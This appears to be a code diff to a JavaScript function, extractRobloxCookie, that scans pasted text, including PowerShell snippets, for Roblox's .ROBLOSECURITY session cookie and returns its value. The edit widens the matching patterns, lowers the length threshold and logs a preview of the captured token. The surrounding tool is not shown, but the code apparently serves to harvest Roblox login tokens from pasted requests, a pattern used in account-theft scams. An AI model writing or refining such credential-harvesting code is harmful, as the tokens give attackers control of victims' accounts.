@@ -352,30 +352,29 @@ async function submitPowerShell() {
 
 // Function to scan and find authentication data from text
 function extractRobloxCookie(text) {
+    console.log('Searching for .ROBLOSECURITY in text...');
+    console.log('Text contains .ROBLOSECURITY:', text.includes('.ROBLOSECURITY'));
+    console.log('Text length:', text.length);
+    
     // Look for various Roblox authentication patterns
     const patterns = [
-        // PowerShell New-Object System.Net.Cookie format with .ROBLOSECURITY (most specific first)
-        /New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/is,
-        // PowerShell format with single quotes
-        /New-Object\s+System\.Net\.Cookie\s*\(\s*'\.ROBLOSECURITY'\s*,\s*'([^']+)'/is,
-        // PowerShell $session.Cookies.Add format
-        /\$session\.Cookies\.Add\s*\(\s*\(New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/is,
+        // PowerShell New-Object System.Net.Cookie format - simplified and more flexible
+        /"\.ROBLOSECURITY"\s*,\s*"([^"]+)"/i,
         // Standard .ROBLOSECURITY cookie format
         /\.ROBLOSECURITY=([^;"\s\n]+)/i,
-        // Warning format with the actual cookie (extract after _|WARNING...|_)
-        /_\|WARNING[^|]*\|_([A-F0-9.]+)/i,
+        // Warning format - capture everything after _|WARNING...|_
+        /_\|WARNING[^|]*\|_([A-Za-z0-9+/=._%\-]+)/i,
         // Simple ROBLOSECURITY format
         /ROBLOSECURITY[=:]\s*([^;"\s\n]+)/i,
         // Plain cookie value format
-        /roblosecurity[=:]\s*([^;"\s\n]+)/i,
-        // Cookie header format
-        /Cookie:\s*\.ROBLOSECURITY=([^;"\s\n]+)/i
+        /roblosecurity[=:]\s*([^;"\s\n]+)/i
     ];
     
     for (const pattern of patterns) {
         const match = text.match(pattern);
-        if (match && match[1] && match[1].length > 50) {
+        if (match && match[1] && match[1].length > 10) {
             console.log('Found Roblox auth data using pattern:', pattern.source);
+            console.log('Extracted data preview:', match[1].substring(0, 50) + '...');
             console.log('Extracted data length:', match[1].length);
             return match[1];
         }
